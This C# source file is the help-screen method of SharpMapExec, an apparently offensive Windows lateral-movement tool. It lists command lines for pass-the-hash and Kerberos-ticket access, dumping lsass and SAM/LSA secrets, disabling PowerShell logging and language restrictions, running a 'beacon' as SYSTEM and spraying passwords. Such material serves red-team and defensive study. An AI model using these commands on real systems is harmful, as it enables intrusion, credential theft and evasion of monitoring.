using System;

namespace SharpMapExec.args
{
    public static class Info
    {
        public static void ShowUsage()
        {
            Console.WriteLine("\r\n  SharpMapExec.exe\r\n  usage:");

            //Cim
            Console.WriteLine("\r\n    --- Cim ---");
            Console.WriteLine(@"        Need plaintext password or the /impersonate flag");
            Console.WriteLine(@"        SharpMapExec.exe ntlm cim /user:USER /password:PASSWORD /computername:TARGET");
            Console.WriteLine("\n       Available Cim modules");
            Console.WriteLine(@"          /m:enable_winrm                             (Runs Enable-PSRemoting -Force)");
            Console.WriteLine(@"          /m:disable_winrm                            (Runs Disable-PSRemoting -Force)");
            Console.WriteLine(@"          /m:disable_pslockdown                       (Modify __PSLockdownPolicy registry to disable CLM)");
            Console.WriteLine(@"          /m:disable_pslogging                        (Modify registry to disable PowerShell Logging)");
            Console.WriteLine(@"          /m:check_pslockdown                         (Check __PSLockdownPolicy registry)");
            Console.WriteLine(@"          /m:check_pslogging                          (Check PowerShell Logging registry)");

            //Reg32
            Console.WriteLine("\r\n    --- Reg32 ---");
            Console.WriteLine(@"        SharpMapExec.exe ntlm reg32 /user:USER /ntlm:HASH /computername:TARGET");
            Console.WriteLine(@"        SharpMapExec.exe kerberos reg32 </user:USER /password:PASSWORD /domain:DOMAIN /dc:DC | /ticket:TICKET.Kirbi>  /computername:TARGET");
            Console.WriteLine("\n       Reg32 modules");
            Console.WriteLine(@"          /m:disable_pslockdown                       (Modify __PSLockdownPolicy registry to disable CLM)");
            Console.WriteLine(@"          /m:disable_pslogging                        (Modify registry to disable PowerShell Logging)");
            Console.WriteLine(@"          /m:check_pslockdown                         (Check __PSLockdownPolicy registry)");
            Console.WriteLine(@"          /m:check_pslogging                          (Check PowerShell Logging registry)");

            //Smb
            Console.WriteLine("\r\n    --- Smb ---");
            Console.WriteLine(@"        SharpMapExec.exe ntlm smb /user:USER /ntlm:HASH /domain:DOMAIN /computername:TARGET");
            Console.WriteLine(@"        SharpMapExec.exe kerberos smb </user:USER /password:PASSWORD /domain:DOMAIN /dc:DC | /ticket:TICKET.Kirbi>  /computername:TARGET");
            Console.WriteLine("\n       Smb modules");
            Console.WriteLine(@"          /m:shares                                   (Scan for accessible Smb shares)");

            //WinRm
            Console.WriteLine("\r\n    --- WinRm ---");
            Console.WriteLine(@"        SharpMapExec.exe ntlm winrm /user:USER /password:PASSWORD /domain:DOMAIN /computername:TARGET ");
            Console.WriteLine(@"        SharpMapExec.exe kerberos winrm </user:USER /rc4:HASH  /domain:DOMAIN /dc:DC | /ticket:TICKET.Kirbi>  /computername:TARGET");
            Console.WriteLine("\n       WinRm modules");
            Console.WriteLine(@"          /m:exec /a:whoami                           (Invoke-Command)");
            Console.WriteLine(@"          /m:exec /a:C:\beacon.exe /system            (Invoke-Command as System)");
            Console.WriteLine(@"          /m:comsvcs                                  (Dump & parse lsass)");
            Console.WriteLine(@"          /m:secrets                                  (Dump and Parse Sam, Lsa, and System Dpapi blobs)");
            Console.WriteLine(@"          /m:assembly /p:Rubeus.exe /a:dump           (Execute local C# assembly in memory)");
            Console.WriteLine(@"          /m:assembly /p:beacon.exe /system           (Execute local C# assembly as System in memory)");
            Console.WriteLine(@"          /m:assembly /p:getMailBox.exe /delegwalk    (Execute local C# assembly in all unique delegation processes in memory)");
            Console.WriteLine(@"          /m:download /path:C:\file /destination:file (Download file from host)");
            Console.WriteLine(@"          /m:upload   /path:C:\file /destination:file (Upload file to host)");

            //domain
            Console.WriteLine("\r\n    --- Domain ---");
            Console.WriteLine(@"        SharpMapExec.exe kerbspray /users:USERS.TXT /passwords:PASSWORDS.TXT /domain:DOMAIN /dc:DC");
            Console.WriteLine(@"        SharpMapExec.exe tgtdeleg");

            //ldap
            Console.WriteLine("\r\n    --- Ldap ---");
            Console.WriteLine(@"        SharpMapExec.exe ntlm ldap /user:USER /password:PASSWORD /domain:DOMAIN /dc:DC /m:MODULE");
            Console.WriteLine(@"        SharpMapExec.exe kerberos ldap </user:USER /password:PASSWORD /domain:DOMAIN /dc:DC /m:MODULE | /ticket:TICKET.Kirbi>");
            Console.WriteLine("\n       Ldap modules");
            Console.WriteLine(@"          /m:spraydata                                (Download user and password policy)");


            Console.WriteLine("\r\n");
        }
    }
}